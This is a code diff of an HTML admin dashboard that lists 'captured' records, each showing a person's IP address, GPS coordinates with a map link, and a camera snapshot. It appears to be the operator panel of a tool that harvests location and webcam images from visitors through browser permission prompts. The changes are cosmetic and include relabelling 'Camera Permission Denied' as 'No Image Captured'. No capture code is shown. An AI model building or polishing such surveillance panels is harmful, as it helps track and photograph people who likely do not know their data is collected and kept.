@@ -2,22 +2,17 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Master Admin Control Center</title>
+    <title>Admin Dashboard</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body class="bg-slate-950 text-white p-6 md:p-12">
     <div class="max-w-6xl mx-auto">
         <div class="flex justify-between items-center mb-8">
-            <div>
-                <h1 class="text-2xl font-bold text-indigo-400">Captured System Logs</h1>
-                <p class="text-slate-400 text-xs mt-1">Automatic 30-day retention policy active.</p>
-            </div>
-            <button onclick="loadLogs()" class="bg-indigo-600 hover:bg-indigo-500 text-xs font-semibold px-4 py-2.5 rounded-xl shadow transition">Refresh Database</button>
+            <h1 class="text-2xl font-bold text-indigo-400">Captured System Logs (30-day retention)</h1>
+            <button onclick="loadLogs()" class="bg-indigo-600 hover:bg-indigo-500 text-xs font-semibold px-4 py-2.5 rounded-xl transition">Refresh Data</button>
         </div>
 
-        <div id="logs-grid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
-            <!-- Dynamic data will render here -->
-        </div>
+        <div id="logs-grid" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6"></div>
     </div>
 
     <script>
@@ -48,11 +43,11 @@
                                     <p><strong>IP:</strong> ${item.ip}</p>
                                     <p><strong>Lat:</strong> ${item.latitude}</p>
                                     <p><strong>Lon:</strong> ${item.longitude}</p>
-                                    ${item.latitude !== 'Not Granted (Denied)' ? `<a href="https://www.google.com/maps?q=${item.latitude},${item.longitude}" target="_blank" class="text-indigo-400 underline block mt-1">View on Google Maps ↗</a>` : ''}
+                                    ${item.latitude !== 'Not Granted (Denied)' ? `<a href="https://www.google.com/maps?q=${item.latitude},${item.longitude}" target="_blank" class="text-indigo-400 underline block mt-1">View on Map ↗</a>` : ''}
                                 </div>
                             </div>
                             <div>
-                                ${item.image_base64 ? `<img src="${item.image_base64}" class="rounded-xl w-full h-44 object-cover border border-slate-800"/>` : '<div class="bg-slate-950 h-32 rounded-xl flex items-center justify-center text-xs text-rose-400 border border-slate-800">Camera Permission Denied</div>'}
+                                ${item.image_base64 ? `<img src="${item.image_base64}" class="rounded-xl w-full h-44 object-cover border border-slate-800"/>` : '<div class="bg-slate-950 h-32 rounded-xl flex items-center justify-center text-xs text-rose-400 border border-slate-800">No Image Captured</div>'}
                             </div>
                         `;
                         grid.appendChild(card);
@@ -63,4 +58,3 @@
     </script>
 </body>
 </html>
-
